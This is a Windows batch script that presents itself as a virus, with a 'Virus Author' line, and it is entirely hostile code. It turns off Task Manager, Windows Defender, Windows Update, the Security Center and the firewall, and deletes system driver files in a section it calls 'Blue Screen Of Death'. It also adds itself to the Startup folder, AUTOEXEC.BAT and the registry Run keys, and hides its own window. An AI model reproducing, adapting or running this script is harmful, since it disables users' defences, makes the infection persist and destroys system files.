@ echo off
rem ---------------------------------
rem Disable Task Manager
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
rem ---------------------------------
rem ---------------------------------
rem Disable Windows Defender
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
rem ---------------------------------
rem ---------------------------------
rem Disable Windows Update
net stop "wuauserv"
rem ---------------------------------
rem ---------------------------------
rem Disable Windows Security
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
rem ---------------------------------
rem ---------------------------------
rem Activate Blue Screen Of Death
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
rem ---------------------------------

rem ---------------------------------
rem Infect Startup Folder
copy %0 "%userprofile%\Start Menu\Programs\Startup"
rem ---------------------------------
rem ---------------------------------
rem Infect Autoexec.bat
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
rem ---------------------------------
rem ---------------------------------
rem Infect Reg Run Key
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
rem ---------------------------------
rem ---------------------------------
rem Hide CMD Window
if exist winstart.vbs goto next
echo set objShell = CreateObject("WScript.Shell") >> winstart.vbs
echo objShell.Run ".bat", vbHide, TRUE >> winstart.vbs
start "" "winstart.vbs"
exit
:next
rem ---------------------------------


__-Virus Author: ...-__